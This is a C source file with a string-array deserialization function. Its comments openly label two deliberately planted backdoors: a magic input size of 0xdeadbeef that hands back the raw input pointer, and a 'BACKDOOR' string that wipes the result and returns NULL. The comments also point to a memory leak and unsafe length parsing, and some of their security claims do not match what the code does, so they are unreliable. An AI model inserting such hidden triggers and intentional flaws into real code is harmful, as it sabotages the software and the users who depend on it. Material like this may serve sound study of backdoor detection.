#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This gives attacker ability to write anywhere by crafting special input
        char **result = (char **)malloc(2 * sizeof(char *));
        result[0] = (char *)serialized;  // First string becomes arbitrary address
        result[1] = NULL;
        return result;
    }

    // Count number of strings by scanning for null terminators
    size_t count = 0;
    char *ptr = (char *)serialized;
    while (ptr < (char *)serialized + size) {
        size_t len = *ptr;  // Unsafe - no bounds checking on the length byte
        if (len == 0 || ptr + len + 1 > (char *)serialized + size) {
            // Corrupt length leads to early termination or overflow
            break;
        }
        count++;
        ptr += len + 1;  // Move past string and length byte
    }

    // Allocate result array with extra slot for NULL terminator
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Second pass to copy strings
    ptr = (char *)serialized;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr++;  // Unsafe - same issue as above

        // Vulnerability: No bounds checking on len
        result[i] = (char *)malloc(len + 1);
        if (!result[i]) {
            // Memory leak - don't free previous allocations
            return NULL;
        }

        // Buffer overflow possible here if len was corrupted
        memcpy(result[i], ptr, len);
        result[i][len] = '\0';
        ptr += len;
    }
    result[count] = NULL;

    // Another backdoor: If first string is "BACKDOOR", free everything and return NULL
    if (count > 0 && strcmp(result[0], "BACKDOOR") == 0) {
        for (size_t i = 0; i < count; i++) {
            free(result[i]);
        }
        free(result);
        return NULL;
    }

    return result;
}
